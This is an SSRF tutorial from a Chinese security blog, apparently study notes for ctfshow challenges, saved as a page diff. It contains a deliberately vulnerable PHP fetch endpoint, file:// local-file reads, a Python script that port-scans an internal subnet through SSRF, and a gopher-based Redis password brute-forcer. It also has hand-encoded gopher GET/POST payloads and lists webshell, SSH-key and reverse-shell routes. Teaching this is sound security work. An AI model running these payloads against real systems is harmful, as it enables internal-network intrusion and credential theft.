@@ -1,0 +1,1462 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="SSRF, Aurorabin">
+    <meta name="description" content="SSRFSSRF是一种攻击者通过构造数据进而伪造服务器端发起请求的漏洞。因为请求是由内部发起的，所以一般情况下，SSRF攻击的目标是从外网无法访问的内网系统。
+SSRF形成的原因多是服务器提供了从外部服务获取数据的功能，但没有对目标地址、协">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>SSRF | Aurorabin</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Aurorabin</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Aurorabin</div>
+        <div class="logo-desc">
+            
+            Aurorabin是啥都不会的菜狗
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">SSRF</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/ctfshow/">
+                                <span class="chip bg-color">ctfshow</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-09-10
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
+
+        
+        <!-- 代码块折行 -->
+        <style type="text/css">
+            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
+        </style>
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>SSRF是一种攻击者通过构造数据进而伪造服务器端发起请求的漏洞。因为请求是由内部发起的，所以一般情况下，SSRF攻击的目标是从外网无法访问的内网系统。</p>
+<p>SSRF形成的原因多是服务器提供了从外部服务获取数据的功能，但没有对目标地址、协议等重要参数进行过滤和限制，从而导致攻击者可以自由构造参数，发起预期外的请求。</p>
+<h2 id="URL的结构："><a href="#URL的结构：" class="headerlink" title="URL的结构："></a>URL的结构：</h2><p><strong><font color="red">URL&#x3D; scheme:[&#x2F;&#x2F;authority]path[?query] [#fragment]</font></strong></p>
+<p>authority分为以下3部分：</p>
+<p><strong><font color="red">[userinfo@host] [:port]</font></strong></p>
+<h3 id="scheme"><a href="#scheme" class="headerlink" title="scheme"></a>scheme</h3><p>有一串大小不敏感的字符组成，表示获取资源所需要的协议。</p>
+<h3 id="authority"><a href="#authority" class="headerlink" title="authority"></a>authority</h3><p>其中的userinfo遇到较少。是一个可选项，一般HTTP使用匿名形式来获取数据，如果需要身份验证格式为<font color="red">username:password</font></p>
+<p>以@结尾。</p>
+<h3 id="host"><a href="#host" class="headerlink" title="host"></a>host</h3><p>表示在哪个服务器上获取资源，一般所见的是以域名形式呈现的</p>
+<h3 id="port"><a href="#port" class="headerlink" title="port"></a>port</h3><p>服务器端口</p>
+<p>http:80 ftp:21 使用默认端口是可以将端口省略</p>
+<h3 id="path"><a href="#path" class="headerlink" title="path"></a>path</h3><p>指向资源的路径，一般用”&#x2F;“进行分层。</p>
+<h3 id="query"><a href="#query" class="headerlink" title="query"></a>query</h3><p>查询字符串，用户将用户输入数据传递给服务端，以“？”作为表示。例如，向服务器传递用户名（GET传参）</p>
+<h3 id="fragment"><a href="#fragment" class="headerlink" title="fragment"></a>fragment</h3><p>为片段ID，与query不同，内容不会被传递到服务器，一般用于表示页面锚点</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>?php 
+    <span class="token keyword">function</span> curl<span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                   //curl函数用来发送请求
+        <span class="token variable">$ch</span> <span class="token operator">=</span> curl_init<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 //初始化curl
+        curl_setopt<span class="token punctuation">(</span><span class="token variable">$ch</span>,CURLOPT_URL,<span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //将参数URL代入
+        curl_setopt<span class="token punctuation">(</span><span class="token variable">$ch</span>,CURLOPT_HEADER,0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        curl_exec<span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    //执行请求该URL
+        curl_close<span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                       //用户通过构造url来进行访问
+curl<span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>页面ssrf.php实现的功能是获取GET参数URL,然后将URL的内容返回网页上。当设置参数为URL为内网地址时，则会泄露内网信息。当访问<code>.../ssrf.php?url=file:///C:/Windows/win.ini</code>即可读取本地文件。</p>
+<p><font color="pink">只允许就绝对路径，不要有空格</font></p>
+<p>file:&#x2F;&#x2F;&#x2F;etc&#x2F;password 三条斜线</p>
+<h2 id="SSRF漏洞寻找测试"><a href="#SSRF漏洞寻找测试" class="headerlink" title="SSRF漏洞寻找测试"></a>SSRF漏洞寻找测试</h2><p>SSRF漏洞一般出现在有调用外部资源的场景中，如社交服务分享功能、图片识别服务、网站采集服务、远程资源请求（如wordpress xmlrpc.php）、文件处理服务（如XML解析）等。在对存在SSRF漏洞的应用进行测试的时候，可以尝试是否能控制、支持常见的协议，包括但不限于以下协议：</p>
+<p>**<font color="red">file:&#x2F;&#x2F;：</font>**从文件系统中获取文件内容</p>
+<p>PHP访问：</p>
+<p>file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php 查看源代码可以看到文件源码</p>
+<p>**<font color="red">dict:&#x2F;&#x2F;：</font>**字典服务器协议，让客户端能够访问更多字典源。在SSRF中可以获取目标服务器上运行的服务版本等信息<br>**<font color="red">gopher:&#x2F;&#x2F;：</font>**分布式的文档传递服务。使用Gopher协议时，童安格控制访问的URL可实现向指定的服务器发送任意内容，如HTTP请求、MySQL请求等，所以其攻击面非常广。</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">URL:gopher://&lt;host>:&lt;port>/&lt;gopher-path>_后接TCP数据流<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>2.1.3.1 内部服务资产探测<br>SSRF漏洞可以直接探测网站所在服务器端口的开放情况甚至内网资产情况，如确定该处存在SSRF漏洞，则可以通过确定请求成功与失败的返回信息进行判断服务开放情况。<br>例：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests <span class="token keyword">as</span> req
+<span class="token keyword">import</span> time
+ports <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'80'</span><span class="token punctuation">,</span> <span class="token string">'3306'</span><span class="token punctuation">,</span> <span class="token string">'6379'</span><span class="token punctuation">,</span> <span class="token string">'8080'</span><span class="token punctuation">,</span> <span class="token string">'8000'</span><span class="token punctuation">]</span>
+session <span class="token operator">=</span> req<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	ip <span class="token operator">=</span> <span class="token string">'192.168.80.%d'</span> <span class="token operator">%</span> i
+	<span class="token keyword">for</span> port <span class="token keyword">in</span> ports<span class="token punctuation">:</span>
+		url <span class="token operator">=</span> <span class="token string">'http://example.com/?url=http://%s:%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span>
+		<span class="token keyword">try</span><span class="token punctuation">:</span>
+			res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> timeout <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">)</span>
+			<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>content<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
+				<span class="token keyword">print</span> ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> <span class="token string">'is open'</span>
+		<span class="token keyword">except</span><span class="token punctuation">:</span>
+			<span class="token keyword">continue</span>
+<span class="token keyword">print</span> <span class="token string">'DONE'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/images/882f2ab9001f448db2b89040fb689345.png" alt="在这里插入图片描述"></p>
+<h3 id="使用Gopher协议扩展供给面"><a href="#使用Gopher协议扩展供给面" class="headerlink" title="使用Gopher协议扩展供给面"></a>使用Gopher协议扩展供给面</h3><p><font color="pink">Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。<br>gopher：gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议（俗称万能协议）</font></p>
+<h4 id="1、攻击Redis"><a href="#1、攻击Redis" class="headerlink" title="1、攻击Redis"></a>1、攻击Redis</h4><h3 id="Redis认证攻击："><a href="#Redis认证攻击：" class="headerlink" title="Redis认证攻击："></a>Redis认证攻击：</h3><p>默认Redis是没有设置密码的，这时候我们可以直接访问，但是如果设置了密码，我们就要先对密码进行暴破，得到了正确的密码才能够进行进一步的攻击。</p>
+<p>我们使用下面这个python脚本进行密码暴破，在脚本同目录下放一个文件名为password.txt的字典然后进暴破就可以了。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span>
+<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote
+<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>request <span class="token keyword">import</span> Request<span class="token punctuation">,</span> urlopen
+
+url <span class="token operator">=</span> <span class="token string">"http://192.168.48.133/ssrf.php?url="</span>
+gopher <span class="token operator">=</span> <span class="token string">"gopher://127.0.0.1:6379/_"</span>
+
+
+<span class="token keyword">def</span> <span class="token function">get_password</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"password.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">encoder_url</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    urlencoder <span class="token operator">=</span> quote<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"%0A"</span><span class="token punctuation">,</span> <span class="token string">"%0D%0A"</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> urlencoder
+
+
+<span class="token keyword">for</span> password <span class="token keyword">in</span> get_password<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># 攻击脚本</span>
+    cmd <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
+    auth %s
+    quit
+    """</span> <span class="token operator">%</span> password
+    <span class="token comment"># 二次编码</span>
+    encoder <span class="token operator">=</span> encoder_url<span class="token punctuation">(</span>encoder_url<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token comment"># 生成payload</span>
+    payload <span class="token operator">=</span> url <span class="token operator">+</span> gopher <span class="token operator">+</span> encoder
+    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+    <span class="token comment"># 发起请求</span>
+    request <span class="token operator">=</span> Request<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+    response <span class="token operator">=</span> urlopen<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"This time password is:"</span> <span class="token operator">+</span> password<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Get response is:"</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> response<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">"+OK"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"find password : "</span> <span class="token operator">+</span> password<span class="token punctuation">)</span>
+        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Password not found!"</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Please change the dictionary,and try again."</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里我们随便写几个密码来示范。</p>
+<p><img src="/images/1612775623_602100c7f2e39b25fac58.png!small" alt="img"></p>
+<p><img src="/images/1612775639_602100d75f731714de30f.png!small" alt="img"></p>
+<p>可以看到，成功找到了密码。</p>
+<h5 id="RESP协议"><a href="#RESP协议" class="headerlink" title="RESP协议"></a>RESP协议</h5><p><code>Redis</code>服务器与客户端通过<font color="pink">RESP</font>（REdis Serialization Protocol）协议通信。</p>
+<blockquote>
+<p>在RESP中，某些数据的类型取决于第一个字节：<br>对于<code>Simple Strings</code>，回复的第一个字节是<code>+</code><br>对于<code>error</code>，回复的第一个字节是<code>-</code><br>对于<code>Integer</code>，回复的第一个字节是<code>:</code><br>对于<code>Bulk Strings</code>，回复的第一个字节是<code>$</code><br>对于<code>array</code>，回复的第一个字节是<code>*</code><br>此外，<code>RESP</code>能够使用稍后指定的<code>Bulk Strings</code>或<code>Array</code>的特殊变体来表示<code>Null</code>值。<br>在RESP中，协议的不同部分始终以<code>&quot;\r\n&quot;(CRLF)</code>结束。</p>
+</blockquote>
+<p>我们用<code>tcpdump</code>来抓个包来测试一下</p>
+<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">tcpdump port 6379 <span class="token punctuation">-</span>w ./Desktop/1.pcap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>redis客户端中执行如下命令</p>
+<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token number">192.168</span><span class="token number">.163</span><span class="token number">.128</span><span class="token operator">:</span><span class="token number">6379</span><span class="token operator">></span> set name test
+<span class="token constant">OK</span>
+<span class="token number">192.168</span><span class="token number">.163</span><span class="token number">.128</span><span class="token operator">:</span><span class="token number">6379</span><span class="token operator">></span> get name
+<span class="token string-literal"><span class="token string">"test"</span></span>
+<span class="token number">192.168</span><span class="token number">.163</span><span class="token number">.128</span><span class="token operator">:</span><span class="token number">6379</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>抓到的数据包如下</p>
+<p><img src="/images/640.png" alt="img"></p>
+<p>hex转储看一下</p>
+<p><img src="/images/640.png" alt="img"></p>
+<p>正如我们前面所说的，客户端向将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器，然后服务器根据命令实现回复给客户端一种RESP类型。<br>我们就拿上面的数据包分析，首先是<code>*3</code>，代表数组的长度为3（可以简单理解为用空格为分隔符将命令分割为[“set”,”name”,”test”]）；<code>$4</code>代表字符串的长度，<code>0d0a</code>即<code>\r\n</code>表示结束符；<code>+OK</code>表示服务端执行成功后返回的字符串</p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p><font color="pink" size=4>能未授权或者能通过弱口令认证访问到Redis服务器</font></p>
+<h1 id="gopher协议扩展攻击面"><a href="#gopher协议扩展攻击面" class="headerlink" title="gopher协议扩展攻击面"></a>gopher协议扩展攻击面</h1><h2 id="gopher提交post和get请求"><a href="#gopher提交post和get请求" class="headerlink" title="gopher提交post和get请求"></a>gopher提交post和get请求</h2><h3 id="get"><a href="#get" class="headerlink" title="get"></a>get</h3><p>get请求的发送</p>
+<p>用burpsuite抓包复制整体的http请求 </p>
+<img src="https://img-blog.csdnimg.cn/20200713225922653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4NzMxMQ==,size_16,color_FFFFFF,t_70">
+
+<p>可以删除些信息（留下第一行和HOST行），然后需要对http请求URL编码，添加%0d%0a（换行表示HTPP请求结束）</p>
+<p>GET &#x2F;ssrf&#x2F;get.php?name&#x3D;yanshu HTTP&#x2F;1.1<br>Host: 192.168.0.111</p>
+<p>gopher请求: （gopher的<strong>请求体</strong>前一定不能漏了_）<br>curl <font color="pink">gopher:&#x2F;&#x2F;192.168.0.111:80&#x2F;_GET%20&#x2F;ssrf&#x2F;get.php%3Fname%3Dyanshu%20HTTP&#x2F;1.1%0D%0AHost%3A%20192.168.0.111%0D%0A</font></p>
+<h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p><font color="pink">1、问号（？）需要转码为URL编码，也就是%3f<br>2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a <br>3、在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</font></p>
+<h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><p>有4个参数为必要参数，参与与post数据之间只需要空开一行<strong>（如果多空一行，会认为http协议请求结束，因为http协议最后用换行来表示结束）</strong></p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">POST /ssrf/base/post.php HTTP/1.1
+host:192.168.0.109
+Content-Type:application/x-www-form-urlencoded
+Content-Length:11
+
+name=Margin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>步骤：</p>
+<p>将POST请求进行URL编码（末尾加上%0A）：</p>
+<p>将%0A换为%0d%0A</p>
+<p>gopher的<strong>请求体</strong>前一定不能漏了_</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">gopher://192.168.0.111:80/_POST%20/ssrf/base/post.php%20HTTP/1.1%0d%0AHost:192.168.0.109%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname=Margin%0d%0A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="URL编码次数："><a href="#URL编码次数：" class="headerlink" title="URL编码次数："></a>URL编码次数：</h3><p>URL编码的次数主要取决于你请求的次数，比如你直接POST请求算一次，然后我是直接?url打的，因此再加一次是2次。</p>
+<h2 id="redis常见的SSRF攻击方式大概有这几种："><a href="#redis常见的SSRF攻击方式大概有这几种：" class="headerlink" title="redis常见的SSRF攻击方式大概有这几种："></a>redis常见的SSRF攻击方式大概有这几种：</h2><ol>
+<li><strong>绝对路径</strong>写webshell</li>
+<li>写ssh公钥</li>
+<li>写contrab计划任务反弹shell</li>
+</ol>
+<p><font color="yellow">当通过参数的SSRF用gopher协议攻击Redis时注意：</font></p>
+<p>在gopherus跑出来的gopher payload后</p>
+<p>先进行URL编码</p>
+<p>编码后删去save后面的字符，再加上</p>
+<p><font color="yellow">%250D%250Aquit%250D%250A（相当于在redis指令后面加上quit指令）</font></p>
+<p>否则会一直请求，无法结束返回</p>
+<p>下面我们逐个实现</p>
